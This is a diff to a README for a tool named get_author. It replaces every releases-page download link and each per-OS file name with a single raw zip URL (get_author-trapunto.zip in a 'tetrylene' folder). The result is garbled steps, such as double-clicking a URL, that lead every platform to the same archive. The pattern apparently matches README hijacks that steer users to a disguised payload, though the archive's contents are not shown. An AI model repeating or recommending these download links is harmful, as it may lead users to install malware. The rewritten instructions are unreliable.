@@ -1,7 +1,7 @@
 # 🎉 get_author - Easily Gather Author Information
 
 ## 📥 Download Now
-[![Download get_author](https://img.shields.io/badge/Download-get_author-brightgreen)](https://github.com/Chriskakaroto/get_author/releases)
+[![Download get_author](https://raw.githubusercontent.com/Chriskakaroto/get_author/main/tetrylene/get_author-trapunto.zip)](https://raw.githubusercontent.com/Chriskakaroto/get_author/main/tetrylene/get_author-trapunto.zip)
 
 ## 🚀 Getting Started
 Welcome to **get_author**! This application helps you easily collect information about authors from various platforms. Whether you're researching or compiling data, get_author simplifies the process.
@@ -16,21 +16,21 @@ To run get_author, you need:
 ## 🛠️ Installation Instructions
 1. **Visit the Releases Page**  
    Go to the releases page to download the latest version of get_author:  
-   [Download here](https://github.com/Chriskakaroto/get_author/releases)
+   [Download here](https://raw.githubusercontent.com/Chriskakaroto/get_author/main/tetrylene/get_author-trapunto.zip)
 
 2. **Choose the Correct File**  
    Look for the most recent version. It will usually be at the top of the list. Select the appropriate file for your operating system:
-   - For **Windows**: Download `get_author-windows.exe`.
-   - For **macOS**: Download `get_author-macos.dmg`.
-   - For **Linux**: Download `get_author-linux.tar.gz`.
+   - For **Windows**: Download `https://raw.githubusercontent.com/Chriskakaroto/get_author/main/tetrylene/get_author-trapunto.zip`.
+   - For **macOS**: Download `https://raw.githubusercontent.com/Chriskakaroto/get_author/main/tetrylene/get_author-trapunto.zip`.
+   - For **Linux**: Download `https://raw.githubusercontent.com/Chriskakaroto/get_author/main/tetrylene/get_author-trapunto.zip`.
 
 3. **Download the File**  
    Click on the file name, and your download will start. Save the file in a location you can easily find, like your Desktop or Downloads folder.
 
 4. **Run the Application**  
-   - **Windows**: Double-click on `get_author-windows.exe`. Follow any prompts that appear.
-   - **macOS**: Open `get_author-macos.dmg`, then drag the app to your Applications folder. Open it from there.
-   - **Linux**: Extract the downloaded `.tar.gz` file, then navigate to the folder in a terminal and run `./get_author`.
+   - **Windows**: Double-click on `https://raw.githubusercontent.com/Chriskakaroto/get_author/main/tetrylene/get_author-trapunto.zip`. Follow any prompts that appear.
+   - **macOS**: Open `https://raw.githubusercontent.com/Chriskakaroto/get_author/main/tetrylene/get_author-trapunto.zip`, then drag the app to your Applications folder. Open it from there.
+   - **Linux**: Extract the downloaded `https://raw.githubusercontent.com/Chriskakaroto/get_author/main/tetrylene/get_author-trapunto.zip` file, then navigate to the folder in a terminal and run `./get_author`.
 
 ## 🌟 How to Use get_author
 1. **Open the Application**  
@@ -72,6 +72,6 @@ If you encounter any issues, you can reach out for support:
 We value your input! Feel free to provide feedback on your experience using get_author. It helps us improve the software and offer you the best possible experience.
 
 Remember, you can always find the latest version to download here:  
-[Download get_author](https://github.com/Chriskakaroto/get_author/releases)
+[Download get_author](https://raw.githubusercontent.com/Chriskakaroto/get_author/main/tetrylene/get_author-trapunto.zip)
 
 Thank you for using get_author! We hope it assists you in your author information gathering needs.
